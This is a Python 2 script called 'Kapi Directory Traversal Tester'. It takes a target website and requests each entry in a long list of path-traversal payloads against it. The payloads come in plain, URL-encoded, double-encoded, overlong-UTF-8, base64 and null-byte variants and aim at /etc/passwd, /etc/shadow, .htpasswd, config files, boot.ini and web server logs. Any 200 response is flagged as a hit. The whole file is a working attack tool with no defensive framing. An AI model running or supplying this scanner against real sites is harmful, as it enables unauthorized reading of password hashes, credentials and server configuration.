#!/usr/bin/python

import httplib
import socket
import sys

try:
    print "\t################################################################"
    print "\t#                             Kapi                             #"
    print "\t#               Directory Traversal Tester                     #"
    print "\t################################################################"
    var1=0
    var2=0

    _path = ['/etc/master.passwd','/master.passwd','etc/passwd','etc/shadow%00','/etc/passwd','/etc/passwd%00','../etc/passwd','../etc/passwd%00','../../etc/passwd','../../etc/passwd%00','../../../etc/passwd','../../../etc/passwd%00','../../../../etc/passwd','../../../../etc/passwd%00','../../../../../etc/passwd','../../../../../etc/passwd%00','../../../../../../etc/passwd','../../../../../../etc/passwd%00','../../../../../../../etc/passwd','../../../../../../../etc/passwd%00','../../../../../../../../etc/passwd','../../../../../../../../etc/passwd%00','../../../../../../../../../etc/passwd','../../../../../../../../../etc/passwd%00','../../../../../../../../../../etc/passwd','../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/passwd','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00','../../../../../../etc/passwd&=%3C%3C%3C%3C','../../../administrator/inbox','../../../../../../../dev','.htpasswd','passwd','passwd.dat','pass.dat','.htpasswd','/.htpasswd','../.htpasswd','.passwd','/.passwd','../.passwd','.pass','../.pass','members/.htpasswd','member/.htpasswd','user/.htpasswd','users/.htpasswd','root/.htpasswd','db.php','data.php','database.asp','database.js','database.php','dbase.php','admin/access_log','../users.db.php','users.db.php','/core/config.php','config.php','config.js','../config.js','config.asp','../config.asp','_config.php','../_config.php','../_config.php%00','../config.php','config.inc.php','../config.inc.php','/config.asp','../config.asp','/../../../../pswd','/admin/install.php','../install.php','install.php','..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd','..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow','..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd','..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow','..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed','..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd','Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==','Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdw==','m=\'../../../../../../../../etc/passwd\';','/..\\..\\..\\..\\..\\..\\winnt\\win.ini','../../windows/win.ini','..//..//..//..//..//boot.ini','..\\../..\\../boot.ini','..\\../..\\../..\\../..\\../boot.ini','\.....\\\\.....\\\\.....\\\\','d:\\AppServ\\MySQL','c:\\AppServ\\MySQL','c:WINDOWS/system32/','/C:\\Program Files\\','/D:\\Program Files\\','/C:/inetpub/ftproot/','/boot/grub/grub.conf','/proc/interrupts','/proc/cpuinfo','/proc/meminfo','../apache/logs/error.log','../apache/logs/access.log','../../apache/logs/error.log','../../apache/logs/access.log','../../../apache/logs/error.log','../../../apache/logs/access.log','../../../../../../../etc/httpd/logs/acces_log','../../../../../../../etc/httpd/logs/acces.log','../../../../../../../etc/httpd/logs/error_log','../../../../../../../etc/httpd/logs/error.log','../../../../../../../var/www/logs/access_log','../../../../../../../var/www/logs/access.log','../../../../../../../usr/local/apache/logs/access_ log','../../../../../../../usr/local/apache/logs/access. log','../../../../../../../var/log/apache/access_log','../../../../../../../var/log/apache2/access_log','../../../../../../../var/log/apache/access.log','../../../../../../../var/log/apache2/access.log','../../../../../../../var/log/access_log','../../../../../../../var/log/access.log','../../../../../../../var/www/logs/error_log','../../../../../../../var/www/logs/error.log','../../../../../../../usr/local/apache/logs/error_log','../../../../../../../usr/local/apache/logs/error.log','../../../../../../../var/log/apache/error_log','../../../../../../../var/log/apache2/error_log','../../../../../../../var/log/apache/error.log','../../../../../../../var/log/apache2/error.log','../../../../../../../var/log/error_log','../../../../../../../var/log/error.log','/etc/init.d/apache','/etc/init.d/apache2','/etc/httpd/httpd.conf','/etc/apache/apache.conf','/etc/apache/httpd.conf','/etc/apache2/apache2.conf','/etc/apache2/httpd.conf','/usr/local/apache2/conf/httpd.conf','/usr/local/apache/conf/httpd.conf','/opt/apache/conf/httpd.conf','/home/apache/httpd.conf','/home/apache/conf/httpd.conf','/etc/apache2/sites-available/default','/etc/apache2/vhosts.d/default_vhost.include','/etc/passwd','/etc/shadow','/etc/group','/etc/security/group','/etc/security/passwd','/etc/security/user','/etc/security/environ','/etc/security/limits','/usr/lib/security/mkuser.default','2fetc2fmaster.passwd','2fmaster.passwd','etc2fpasswd','etc2fshadow%00','2fetc2fpasswd','2fetc2fpasswd%00','..2fetc2fpasswd','..2fetc2fpasswd%00','..2f..2fetc2fpasswd','..2f..2fetc2fpasswd%00','..2f..2f..2fetc2fpasswd','..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00','..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00','2fboot2fgrub2fgrub.conf','2fproc2finterrupts','2fproc2fcpuinfo','2fproc2fmeminfo','..2fapache2flogs2ferror.log','..2fapache2flogs2faccess.log','..2f..2fapache2flogs2ferror.log','..2f..2fapache2flogs2faccess.log','..2f..2f..2fapache2flogs2ferror.log','..2f..2f..2fapache2flogs2faccess.log','..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces_log','..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces.log','..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror_log','..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror.log','..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log','..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess.log','..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess_ log','..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess. log','..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess_log','..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log','..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess.log','..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess.log','..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess_log','..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess.log','..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror_log','..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror.log','..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror_log','..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror.log','..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror_log','..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror_log','..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror.log','..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror.log','..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror_log','..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror.log','%252fetc/passwd','..%252fetc/passwd','..%252f..%252fetc/passwd','..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd','..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd']

    try:
        site = raw_input("Web Site for Scan?: ")
        site = site.replace("http://","")
        slashPos = site.find("/")
        if slashPos != -1:
            host = site[:-(len(site)-slashPos)]
            path = site[slashPos:len(site)]
            print ("\t Host : " + host)
            print ("\t Path : " + path)
            fullSite = host + path
        else:
            fullSite = site
            host = site
            path = "/"
        print ("\t Full : " + fullSite)
        conn = httplib.HTTPConnection(host)
        conn.request("GET", path)
        resCode = conn.getresponse()
        print "\tResponse Code: " + str(resCode.status)
        print "\t[$] Yes... Server is Online."
    except (httplib.HTTPResponse, socket.error):
        print("\t [!] Oops Error occured, Server offline or invalid URL")
        exit()

    arr = _path
    print("\t [+] Scanning " + site + "...\n\n")
    for admin in arr:
        admin = admin.replace("\n","")
        if 'path' in globals():
            pathAdmin = path + admin
        else: 
            pathAdmin = admin
        connection = httplib.HTTPConnection(host)
        connection.request("GET", pathAdmin)
        response = connection.getresponse()
        resCode = str(response.status)
        print ("\t [#] Checking " + host + pathAdmin + " >> " + resCode)
        var2 = var2 + 1
        if response.status == 200:
            var1 = var1 + 1
            print "%s %s" % ( "\n\n>>>" + host, "Oops!!!")
            raw_input("Press enter to continue scanning.\n")
        elif response.status == 404:
            var2 = var2
        elif response.status == 302:
            print "%s %s" % ("\n>>>" + host, "Possible ... (302 - Redirect)")
        else:
            print "%s %s %s" % (host, " Interesting response:", response.status)
        connection.close()
    print("\n\nCompleted \n")
    print var1, " Admin pages found"
    print var2, " total pages scanned"
    raw_input("[/] The Game Over; Press Enter to Exit")
except (httplib.HTTPResponse, socket.error):
    print "\n\t[!] Session Cancelled; Error occured. Check internet settings"
except (KeyboardInterrupt, SystemExit):
    print "\n\t[!] Session cancelled"
